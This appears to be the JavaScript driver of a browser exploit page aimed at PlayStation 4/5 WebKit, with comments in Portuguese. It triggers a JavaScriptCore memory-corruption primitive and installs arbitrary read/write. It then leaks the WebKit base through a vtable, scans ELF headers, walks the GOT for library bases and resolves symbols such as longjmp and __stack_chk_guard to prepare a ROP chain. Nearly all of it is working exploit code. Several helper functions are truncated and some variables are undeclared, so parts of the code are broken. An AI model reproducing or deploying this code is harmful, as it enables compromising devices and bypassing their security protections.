<script type="module">
import { int64 }             from './resources/int64.js';
import { establishPrimitive } from './resources/core.js?v=10';
import { installWindowP }    from './resources/mem.js';

globalThis.int64 = int64;

/* ─── UI helpers ─────────────────────────────────────────── */
const $con     = document.getElementById('console');
const $dot     = document.getElementById('status-dot');
const $stTxt   = document.getElementById('status-text');
const $atTxt   = document.getElementById('attempt-text');

function log(msg, cls = 'log-info') {

function setStatus(msg, state = 'running') {

  $dot.className = state;

function setCard(id, value) {
  const el = document.getElementById(id);
  if (!el) return;
  el.textContent = value;

function addLibRow(name, base) {

                + `<span class="lib-base">0x${base}</span>`;

/* ─── firmware detect ────────────────────────────────────── */
const ua = navigator.userAgent;
const fwMatch = /PlayStation 4\/(\d+\.\d+)/.exec(ua)
             || /PlayStation 5\/(\d+\.\d+)/.exec(ua);
const fwStr = fwMatch ? fwMatch[1] : '';
$fwLabel.textContent = fwStr
  ? `PlayStation — firmware ${fwStr}`
  : `UA: ${ua.slice(0, 60)}`;

/* ─── int64 helpers ──────────────────────────────────────── */
function i64n(a) { return a.hi * 0x100000000 + a.low; }
function numToI64(n) {
  const hi = Math.floor(n / 0x100000000) >>> 0;
  const lo = (n - hi * 0x100000000) >>> 0;
  return new int64(lo, hi);
}
function alignDown(a, align) {
  return new int64((a.low & ~(align - 1)) >>> 0, a.hi);
}
function isValidPtr(a) {
  return a.hi > 0 && a.hi <= 0xFF && a.low > 0;
}
function read2(p, addr) {
  // read2 can be absent in some mem.js builds — fallback via read4
  if (typeof p.read2 === 'function') return p.read2(addr);
  return p.read4(addr) & 0xFFFF;
}
function readStr(p, addr, maxLen = 128) {
  let s = '';
  for (let i = 0; i < maxLen; i++) {
    const c = p.read1(addr.add32(i));
    if (c === 0) break;
    s += String.fromCharCode(c);
  }
  return s;
}

/* ─── FASE 1: /proc/self/maps ────────────────────────────── */
async function tryProcMaps() {
  for (const url of ['file:///proc/self/maps', 'file:///proc/self/smaps']) {
    try {
      const r = await fetch(url);
      const txt = await r.text();
      if (txt && txt.length > 50) {
        log('[+] /proc/self/maps acessível!', 'log-ok');
        log(txt.slice(0, 3000), 'log-dim');
        return txt;
      }
    } catch(_) {}
  }
  log('[-] /proc/self/maps bloqueado (sandbox ativo)', 'log-warn');
  return null;
}

/* ─── FASE 2: ponteiro inicial (nativeCtor do core.js) ──── */
function getWebKitPointer(p) {
  const ctor = globalThis.__ps5NativeCtor;
  if (typeof ctor === 'number' && ctor > 0x100000000) {
    const ptr = numToI64(ctor);
    log('[+] __ps5NativeCtor: 0x' + ptr.toString(), 'log-addr');
    setCard('card-ctor', '0x' + ptr.toString());
    return ptr;
  }
  log('[-] __ps5NativeCtor não disponível', 'log-warn');
  return null;
}

/* ─── FASE 2.5: âncora em .text via vtable ───────────────
   CRÍTICO: o __ps5NativeCtor no PS4 pode apontar para .data
   (segmento separado). Usar ele diretamente no scan → SIGSEGV
   no primeiro gap entre segmentos.

   Solução: ler vtable da textarea (offset 0x10 no PS4) e
   usar os slots (function pointers em .text) como âncora.
   Esses ponteiros são GARANTIDAMENTE em .text — sem gaps.
──────────────────────────────────────────────────────────── */
function getTextAnchor(p) {
  log('[*] Lendo vtable da textarea para âncora em .text...', 'log-info');

  const ta = document.createElement('textarea');
  const obj = p.leakval(ta);
  log('  textarea JSCell @ 0x' + obj.toString(), 'log-dim');

  // Offset 0x10 confirmado no PS4 para vtable pointer
  const vt = p.read8(obj.add32(0x10));
  if (!isValidPtr(vt)) {
    log('  [-] vtable em 0x10 inválida: 0x' + vt.toString(), 'log-warn');
    return null;
  }
  log('  vtable @ 0x' + vt.toString(), 'log-dim');

  // Coleta todos os slots da vtable (function ptrs em .text)
  let minFnAddr = null;
  let minFnNum  = Infinity;
  const vtN = i64n(vt);

  for (let i = 0; i < 64; i++) {
    try {
      const slot = p.read8(vt.add32(i * 8));
      const n = i64n(slot);
      // Ponteiro em .text: válido, não-page-aligned, ABAIXO da vtable
      // (vtable fica em .rodata que é ACIMA de .text no layout do PS4)
      if (!isValidPtr(slot)) continue;
      if ((n & 0xFFF) === 0) continue;  // page-aligned = provavelmente outra vtable
      if (n >= vtN) continue;            // acima da vtable = não é .text neste layout
      if (n < minFnNum) {
        minFnNum  = n;
        minFnAddr = slot;
      }
    } catch(_) {}
  }

  if (!minFnAddr) {
    log('  [-] Nenhum fn ptr válido em slots da vtable', 'log-warn');
    return null;
  }

  log('[+] Âncora .text (min vtable slot): 0x' + minFnAddr.toString(), 'log-ok');
  log('  Distância vtable→anchor: '
    + ((vtN - minFnNum) / 1024 / 1024).toFixed(1) + ' MB', 'log-dim');
  return minFnAddr;
}

/* ─── FASE 3: ELF scan (limitado e seguro) ───────────────
   USA âncora em .text — nunca cruza gaps de segmento.
   Passo: 0x1000 (4 KB) — não perde bases misalinhadas.
   Limite: 15 MB — ancora está ~10 MB acima da base.
──────────────────────────────────────────────────────────── */
async function findElfBase(p, anchor, label) {
  const PAGE   = 0x1000;
  const MAX_MB = 15;
  const MAX_PG = (MAX_MB * 1024 * 1024) / PAGE;  // 3840 iterações

  log('[*] Scan ELF (' + label + '): '
    + MAX_MB + ' MB · passo 0x1000 · âncora 0x' + anchor.toString(), 'log-info');

  let base = alignDown(anchor, PAGE);

  for (let i = 0; i < MAX_PG; i++) {
    if (base.hi === 0 && base.low < PAGE) break;

    // Yield a cada 256 páginas (1 MB)
    if (i % 256 === 0) {
      const mb = (i * PAGE / 1024 / 1024).toFixed(1);
      setStatus('Scan ' + label + ': ' + mb + ' MB — 0x' + base.toString(), 'running');
      $stgTxt.textContent = 'elf-scan: -' + mb + 'MB';
      await new Promise(r => setTimeout(r, 0));
    }

    let magic;
    try {
      magic = p.read4(base) >>> 0;
    } catch(_) {
      // Página não mapeada — estamos abaixo do módulo
      log('  [!] página não mapeada @ 0x' + base.toString()
        + ' — limite do módulo atingido', 'log-warn');
      break;
    }

    if (magic === 0x464C457F) {
      // Confirma: ELF64 little-endian
      let cls = 0, enc = 0;
      try { cls = p.read1(base.add32(4)); enc = p.read1(base.add32(5)); }
      catch(_) { base = base.sub32(PAGE); continue; }

      if (cls === 2 && enc === 1) {
        log('[+] ' + label + ' base: 0x' + base.toString()
          + ' (' + i + ' × 0x1000 atrás)', 'log-ok');
        return base;
      }
    }

    base = base.sub32(PAGE);
  }

  log('[-] ELF base de "' + label + '" não encontrada em ' + MAX_MB + ' MB', 'log-warn');
  return null;
}

/* ─── Parse PT_DYNAMIC ───────────────────────────────────── */
function parseDynamic(p, elfBase) {
  let e_phoff, e_phentsize, e_phnum;
  try {
    e_phoff     = p.read8(elfBase.add32(0x20)).low;
    e_phentsize = read2(p, elfBase.add32(0x36));
    e_phnum     = read2(p, elfBase.add32(0x38));
  } catch(_) { return null; }

  let dynOff = null, dynSz = 0;
  for (let i = 0; i < e_phnum && i < 32; i++) {
    try {
      const ph = elfBase.add32(e_phoff + i * e_phentsize);
      if ((p.read4(ph) >>> 0) === 2 /* PT_DYNAMIC */) {
        dynOff = p.read8(ph.add32(0x08)).low;   // p_offset
        dynSz  = p.read8(ph.add32(0x20)).low;   // p_filesz
        break;
      }
    } catch(_) {}
  }
  if (dynOff === null) return null;

  const dynAddr = elfBase.add32(dynOff);
  const r = {
    strtab: null, symtab: null, syment: 0x18,
    pltgot: null, jmprel: null, pltrelsz: 0, soname: ''
  };
  const maxEnt = Math.min(Math.floor(dynSz / 0x10), 512);
  for (let i = 0; i < maxEnt; i++) {
    try {
      const e   = dynAddr.add32(i * 0x10);
      const tag = p.read8(e).low;
      const val = p.read8(e.add32(8));
      if (tag === 0) break;
      if (tag ===  5) r.strtab   = val;
      if (tag ===  6) r.symtab   = val;
      if (tag === 11) r.syment   = val.low;
      if (tag ===  3) r.pltgot   = val;
      if (tag === 23) r.jmprel   = val;
      if (tag ===  2) r.pltrelsz = val.low;
      if (tag === 14 && r.strtab) {
        try { r.soname = readStr(p, r.strtab.add32(val.low)); }
        catch(_) { r.soname = '<NID>'; }
      }
    } catch(_) {}
  }
  return r;
}

/* ─── Find symbol by name ────────────────────────────────── */
function findSymbol(p, elfBase, dyn, name) {
  if (!dyn || !dyn.symtab || !dyn.strtab) return null;
  for (let i = 0; i < 4096; i++) {
    try {
      const sym    = dyn.symtab.add32(i * dyn.syment);
      const stName = p.read4(sym) >>> 0;
      if (stName === 0) continue;
      if (readStr(p, dyn.strtab.add32(stName)) === name)
        return elfBase.add32(p.read8(sym.add32(8)).low);
    } catch(_) {}
  }
  return null;
}

/* ─── Discover imports via GOT ───────────────────────────── */
async function discoverImports(p, dyn, ownerLabel) {
  if (!dyn || !dyn.pltgot) return [];
  const slots = dyn.pltrelsz ? Math.floor(dyn.pltrelsz / 0x18) + 3 : 128;
  const seen  = new Map();

  for (let i = 3; i < slots; i++) {
    let slot;
    try { slot = p.read8(dyn.pltgot.add32(i * 8)); }
    catch(_) { continue; }

    if (!isValidPtr(slot) || (slot.low & 3) !== 0) continue;

    // Usa scan de 8 MB para libs importadas (mais rápido — elas têm base menor)
    const PAGE = 0x1000;
    const MAX_PG = (8 * 1024 * 1024) / PAGE;
    let cur = alignDown(slot, PAGE);
    let libBase = null;

    for (let j = 0; j < MAX_PG; j++) {
      if (!isValidPtr(cur)) break;
      let m;
      try { m = p.read4(cur) >>> 0; }
      catch(_) { break; }
      if (m === 0x464C457F) {
        try {
          if (p.read1(cur.add32(4)) === 2 && p.read1(cur.add32(5)) === 1) {
            libBase = cur; break;
          }
        } catch(_) {}
      }
      cur = cur.sub32(PAGE);
    }

    if (!libBase) continue;
    const key = libBase.toString();
    if (!seen.has(key)) {
      const libDyn  = parseDynamic(p, libBase);
      const soname  = libDyn?.soname || '<NID>';
      seen.set(key, { base: libBase, dyn: libDyn, soname });
      log('  [lib] 0x' + key + '  ' + soname, 'log-addr');
      addLibRow(soname, key);
    }

    if (i % 8 === 0) await new Promise(r => setTimeout(r, 0));
  }
  return [...seen.values()];
}

/* ─── Display constants after base is found ─────────────── */
function showConstants(webkitBase, ctorPtr, textAnchor) {
  const baseN = i64n(webkitBase);
  const lines = document.getElementById('c-lines');
  const usage = document.getElementById('c-usage');
  lines.innerHTML = '';
  usage.innerHTML = '';

  function addLine(txt, cls = '') {
    const d = document.createElement('div');
    d.className = cls;
    d.textContent = txt;
    lines.appendChild(d);
  }

  if (ctorPtr) {
    const rva = i64n(ctorPtr) - baseN;
    addLine('const WEBKIT_CTOR_RVA   = 0x' + rva.toString(16).toUpperCase() + ';'
      + '  // __ps5NativeCtor offset');
  }
  if (textAnchor) {
    const rva = i64n(textAnchor) - baseN;
    addLine('const WEBKIT_ANCHOR_RVA = 0x' + rva.toString(16).toUpperCase() + ';'
      + '  // min .text fn ptr offset');
  }
  addLine('');
  addLine('// Uso direto (elimina scan em futuras execuções):');
  addLine('// const webkitBase = __ps5NativeCtor - WEBKIT_CTOR_RVA;');

  $cbox.style.display = 'block';
}

/* ─── MAIN: leakAllBases ─────────────────────────────────── */
async function leakAllBases(p) {
  /* FASE 1 */
  log('', ''); log('-- FASE 1: /proc/self/maps --------------------', 'log-section');
  await tryProcMaps();

  /* FASE 2 */
  log('', ''); log('-- FASE 2: ponteiro inicial no WebKit ---------', 'log-section');
  const ctorPtr = getWebKitPointer(p);

  /* FASE 2.5 — âncora em .text via vtable
     ─────────────────────────────────────────────────────────
     POR QUE ESTA FASE EXISTE:
     O __ps5NativeCtor no PS4 aponta para a região .data do
     WebKit (segmento RW, endereço MAIOR que .rodata e .text).
     Scan retroativo a partir de .data cruza o gap entre
     PT_LOAD[.data] e PT_LOAD[.text] → SIGSEGV → crash.

     Solução: obtemos um fn ptr de um slot da vtable da textarea,
     que sempre fica em .text (PT_LOAD executável, contíguo com
     o ELF header). O scan de 15 MB fica 100% dentro de .text.
     ─────────────────────────────────────────────────────────  */
  log('', ''); log('-- FASE 2.5: âncora em .text (vtable slots) ---', 'log-section');
  const textAnchor = getTextAnchor(p);

  if (!textAnchor) {
    log('[-] Sem âncora em .text — scan cancelado para evitar crash', 'log-error');
    setStatus('Falha: âncora .text indisponível', 'error');
    return null;
  }

  /* FASE 3 */
  log('', ''); log('-- FASE 3: ELF scan — WebKit ------------------', 'log-section');
  log('[!] Usando âncora .text 0x' + textAnchor.toString()
    + ' (não o ctor — evita crash de segmento)', 'log-warn');

  const webkitBase = await findElfBase(p, textAnchor, 'WebKit');
  if (!webkitBase) {
    setStatus('Falha: WebKit base não encontrada', 'error');
    return null;
  }

  setCard('card-webkit', '0x' + webkitBase.toString());
  $bases.classList.add('visible');
  showConstants(webkitBase, ctorPtr, textAnchor);

  /* FASE 4 */
  log('', ''); log('-- FASE 4: parse DYNAMIC do WebKit ------------', 'log-section');
  const wkDyn = parseDynamic(p, webkitBase);
  if (wkDyn) {
    log('  SONAME:   ' + (wkDyn.soname || '<vazio>'), 'log-info');
    log('  strtab:  0x' + (wkDyn.strtab?.toString() || '?'), 'log-dim');
    log('  pltgot:  0x' + (wkDyn.pltgot?.toString() || '?'), 'log-dim');
    log('  pltrelsz: ' + wkDyn.pltrelsz, 'log-dim');
  } else {
    log('  Falhou ao parsear DYNAMIC', 'log-warn');
  }

  /* FASE 5 */
  log('', ''); log('-- FASE 5: descobrindo libs importadas --------', 'log-section');
  const imports = await discoverImports(p, wkDyn, 'WebKit');
  log('  Total: ' + imports.length + ' módulos', 'log-info');

  // Identifica libkernel / libc
  let lkEntry = null, lcEntry = null;
  for (const lib of imports) {
    const s = lib.soname.toLowerCase();
    if (!lkEntry && (s.includes('kernel') || s.includes('libkernel'))) lkEntry = lib;
    if (!lcEntry && (s.includes('libc')   || s.includes('libscelibc')))  lcEntry = lib;
  }
  if (!lkEntry && imports.length > 0) {
    // Heurística PS4: libkernel é a lib com menor endereço base
    const sorted = [...imports].sort((a,b) => i64n(a.base) - i64n(b.base));
    lkEntry = sorted[0];
    log('  [!] SONAMEs = NIDs. Assumindo libkernel = menor base: 0x'
      + lkEntry.base.toString(), 'log-warn');
  }
  if (lkEntry) { setCard('card-kernel', '0x' + lkEntry.base.toString()); }
  if (lcEntry) { setCard('card-libc',   '0x' + lcEntry.base.toString()); }

  /* FASE 6 */
  log('', ''); log('-- FASE 6: resolução de símbolos --------------', 'log-section');
  const NEEDED = ['setjmp','longjmp','memset','memcpy',
                  'pthread_create','__stack_chk_guard','sceKernelGetProcParam'];
  const symbols = {};
  for (const sym of NEEDED) {
    let found = false;
    for (const lib of imports) {
      if (!lib.dyn) continue;
      const addr = findSymbol(p, lib.base, lib.dyn, sym);
      if (addr) {
        symbols[sym] = addr;
        log('  [+] ' + sym.padEnd(28) + ' 0x' + addr.toString(), 'log-ok');
        found = true; break;
      }
    }
    if (!found)
      log('  [-] ' + sym.padEnd(28) + ' não encontrado (NID?)', 'log-dim');
  }

  /* resultado */
  const result = {
    webkitBase, ctorPtr, textAnchor,
    libkernelBase: lkEntry?.base || null,
    libcBase: lcEntry?.base || null,
    allLibs: imports, symbols
  };

  log('', ''); log('-- RESULTADO FINAL ----------------------------', 'log-section');
  log('webkitBase    = 0x' + result.webkitBase.toString(), 'log-addr');
  log('libkernelBase = 0x' + (result.libkernelBase?.toString() || '?'), 'log-addr');
  log('libcBase      = 0x' + (result.libcBase?.toString() || '?'), 'log-addr');
  log('', '');
  log('window._exploit disponível', 'log-ok');
  globalThis._exploit = result;
  return result;
}

/* ─── Core.js event handler ──────────────────────────────── */
function onCoreEvent(tag, detail, attempt) {
  if (attempt !== undefined) $atTxt.textContent = 'tentativa: ' + attempt;
  $stgTxt.textContent = 'estágio: ' + tag.toLowerCase();
  const VERBOSE = ['PAIR-REPROVED','PAIR-IDENTITY-MAIN','PAIR-IDENTITY-WORKER',
    'PAIR-COMMIT','PAIR-MAIN-RECORD','PAIR-CELLS',
    'PAIR-WORKER-HEADER','PAIR-WIDENED','PAIR-RELEASE'];
  if (VERBOSE.includes(tag)) { log('  ' + tag + ': ' + detail, 'log-dim'); return; }
  const isOk  = tag.includes('UP') || tag.includes('OK') || tag.includes('SUCCESS');
  const isErr = tag.includes('FAIL') || tag.includes('ERROR') || tag.includes('GIVE-UP');
  log('[' + tag + '] ' + detail, isOk ? 'log-ok' : isErr ? 'log-error' : 'log-info');
}

/* ─── BOOT ───────────────────────────────────────────────── */
(async () => {
  log('UA: ' + ua, 'log-dim');
  log('Firmware: ' + (fwStr || 'desconhecido'), 'log-info');
  log('', '');

  setStatus('Rodando exploit JSC (core.js)…', 'running');
  log('-- EXPLOIT JSC (WebKit) ------------------------', 'log-section');

  let carrier;
  try {
    carrier = await establishPrimitive({ onEvent: onCoreEvent, maxAttempts: 0 });
  } catch(err) {
    setStatus('core.js falhou: ' + err.message, 'error');
    log('[ERRO] ' + err.message, 'log-error');
    return;
  }
  log('[+] core.js: primitivo JSC estabelecido!', 'log-ok');
  log('', '');

  log('-- INSTALANDO PRIMITIVA R/W (mem.js) ----------', 'log-section');
  setStatus('Instalando primitiva de memória…', 'running');

  let p;
  try {
    p = installWindowP(carrier, {
      promote: true,
      onEvent: (tag, detail) => log('  [mem/' + tag + '] ' + detail, 'log-dim')
    });
  } catch(err) {
    setStatus('mem.js falhou: ' + err.message, 'error');
    log('[ERRO] ' + err.message, 'log-error');
    return;
  }
  log('[+] R/W arbitrário: window.p instalado', 'log-ok');
  log('', '');

  setStatus('Vazando endereços base…', 'running');
  log('-- LEAK DE BASES -------------------------------', 'log-section');

  let bases;
  try {
    bases = await leakAllBases(p);
  } catch(err) {
    setStatus('leakAllBases falhou: ' + err.message, 'error');
    log('[ERRO] ' + err.message, 'log-error');
    return;
  }

  if (!bases) { setStatus('Falha no leak de bases', 'error'); return; }

  setStatus('Bases vazadas — próximo: ROP chain', 'ok');
  log('', '');
  log('Próximo passo: construir ROP chain com as bases acima.', 'log-info');
  log('window._exploit contém todas as bases e símbolos.', 'log-dim');
})();
